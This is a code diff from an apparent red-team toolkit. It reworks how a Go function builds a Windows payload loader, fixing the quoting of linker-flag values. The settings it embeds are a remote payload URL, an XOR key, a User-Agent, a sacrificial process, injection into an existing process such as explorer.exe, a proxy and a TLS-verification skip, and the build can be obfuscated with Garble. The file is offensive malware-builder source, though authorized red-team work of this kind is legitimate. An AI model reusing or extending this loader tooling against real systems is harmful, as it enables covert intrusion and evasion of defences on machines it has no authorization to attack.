@@ -986,24 +986,35 @@ func BuildLoader(cfg BuildConfig, payloadURL, xorKeyHex, outDir string) (string,
 	outPath := filepath.Join(outDir, resolveOutName(cfg, fmt.Sprintf("loader_%s.exe", arch)))
 	pkgPath := filepath.Join(root, "loaders", "loader-go")
 
-	ldf := fmt.Sprintf("-s -w -X redteam/loaders/loader-go.PayloadURL=%s -X redteam/loaders/loader-go.XORKey=%s",
-		payloadURL, xorKeyHex)
+	ldflags := []string{"-s", "-w"}
+	addX := func(name, value string) {
+		entry := fmt.Sprintf("redteam/loaders/loader-go.%s=%s", name, value)
+		// -ldflags is itself a space-separated string. Quote values such as
+		// User-Agent so spaces do not turn into separate linker arguments.
+		if strings.ContainsAny(value, " \t") {
+			entry = `"` + entry + `"`
+		}
+		ldflags = append(ldflags, "-X", entry)
+	}
+	addX("PayloadURL", payloadURL)
+	addX("XORKey", xorKeyHex)
 	if cfg.UserAgent != "" {
-		ldf += fmt.Sprintf(" -X redteam/loaders/loader-go.UserAgent=%s", cfg.UserAgent)
+		addX("UserAgent", cfg.UserAgent)
 	}
 	if cfg.SacrificialProc != "" {
-		ldf += fmt.Sprintf(" \"-X redteam/loaders/loader-go.SacrificialProc=%s\"", cfg.SacrificialProc)
+		addX("SacrificialProc", cfg.SacrificialProc)
 	}
 	if cfg.InjectMethod != "" && cfg.InjectMethod != "thread" {
 		// reuse InjectMethod as InjectExisting process name when it's a process name (e.g. "explorer.exe")
-		ldf += fmt.Sprintf(" -X redteam/loaders/loader-go.InjectExisting=%s", cfg.InjectMethod)
+		addX("InjectExisting", cfg.InjectMethod)
 	}
 	if cfg.ProxyURL != "" {
-		ldf += fmt.Sprintf(" -X redteam/loaders/loader-go.ProxyURL=%s", cfg.ProxyURL)
+		addX("ProxyURL", cfg.ProxyURL)
 	}
 	if cfg.TLSSkipVerify {
-		ldf += " -X redteam/loaders/loader-go.TLSSkipVerify=true"
+		addX("TLSSkipVerify", "true")
 	}
+	ldf := strings.Join(ldflags, " ")
 
 	cmd := buildCmd(gobin, cfg.Garble, "-trimpath", "-ldflags", ldf, "-o", outPath, pkgPath)
 	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH="+arch, "CGO_ENABLED=0")
